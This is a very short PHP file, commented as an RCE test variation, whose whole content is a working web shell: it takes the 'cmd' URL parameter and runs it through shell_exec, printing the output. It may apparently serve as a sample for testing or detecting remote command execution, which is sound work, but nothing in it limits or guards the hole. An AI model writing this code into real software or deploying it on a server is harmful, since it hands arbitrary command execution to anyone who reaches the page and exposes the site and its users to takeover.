<?php
// RCE test variation #112
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>